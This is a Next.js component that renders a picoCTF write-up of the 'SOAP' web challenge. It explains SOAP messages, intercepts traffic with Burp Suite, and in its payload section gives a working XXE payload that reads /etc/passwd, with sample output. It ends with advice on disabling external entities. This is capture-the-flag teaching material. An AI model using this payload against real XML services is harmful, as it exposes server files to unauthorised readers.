"use client";

import WriteupTemplate from "@/components/WriteupTemplate";

export default function SOAPWriteup() {
  const writeupData = {
    title: "SOAP",
    category: "Web Exploitation",
    points: "n/a",
    author: "Kelvin Creighton",
    difficulty: "medium" as const,
    tags: ["burpsuite", "web", "xxe", "soap"],
    flag: "picoCTF{...}",
    sections: [
      {
        title: "Research",
        cards: [
          {
            title: "What is SOAP (Simple Object Access Protocol)?",
            items: [
              "A protocol used for exchanging information in web services and computer networks.",
              "Allows applications running on different OSs and languages to communicate over HTTP or SMTP.",
              "SOAP messages are formatted in XML, making them platform and language independent.",
            ],
          },
          {
            title: "SOAP Message Structure",
            items: [
              "<strong>Envelope:</strong> Defines the start and end of the message.",
              "<strong>Header:</strong> (Optional) Contains metadata, such as authentication info.",
              "<strong>Body:</strong> Contains the main message or request/response payload.",
              "<strong>Fault:</strong> (Optional) Provides error information.",
            ],
          },
        ],
      },
      {
        title: "Information Gathering",
        prose:
          "The goal of the challenge, as described, is to read the `/etc/passwd` file. This points toward a Local File Inclusion (LFI) or XML External Entity (XXE) vulnerability on a Unix/Linux system.",
        steps: [
          {
            number: "01",
            label: "Intercepting Traffic",
            prose:
              "Using Burp Suite to intercept traffic, we observe the outgoing and incoming requests involving an XML payload.",
            input: `<?xml version="1.0" encoding="UTF-8"?>
<data>
  <ID>1</ID>
</data>`,
            output: `<strong>Special Info:::::</strong>
University in Kigali, Rwanda offereing MSECE, MSIT and MS EAI`,
            reason:
              "<strong>Reason:</strong> The application takes XML input (`ID`), processes it, and reflects content back based on that ID. Since it processes XML without sanitization, it may be vulnerable to XXE (XML External Entity) Injection.",
          },
        ],
      },
      {
        title: "Creating the Payload",
        prose:
          "We can construct an XXE payload to instruct the XML parser to fetch the contents of a local file on the server.",
        steps: [
          {
            number: "01",
            label: "Crafting the XXE Payload",
            input: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ 
  <!ELEMENT data ANY> 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<data>
  <ID>&xxe;</ID>
</data>`,
            output: `root:x:0:0:root:/root:/bin/bash
...
[Flag Content Displayed]`,
            reason:
              '<strong>Reason:</strong> `&lt;!DOCTYPE data [...]>` starts the Document Type Definition. `&lt;!ENTITY xxe SYSTEM "file:///etc/passwd">` defines an external entity `xxe` that reads the local `/etc/passwd` file. When the parser expands the `&xxe;` entity inside the `ID` tags, it replaces it with the file contents, exposing the flag.',
          },
        ],
      },
      {
        title: "Key Takeaways",
        cards: [
          {
            title: "",
            items: [
              "Always disable external entity processing in XML parsers to prevent XXE vulnerabilities.",
              "XML-based protocols like SOAP inherently carry this risk if security features of the parser are not properly configured.",
            ],
          },
        ],
      },
    ],
  };

  return <WriteupTemplate data={writeupData} />;
}
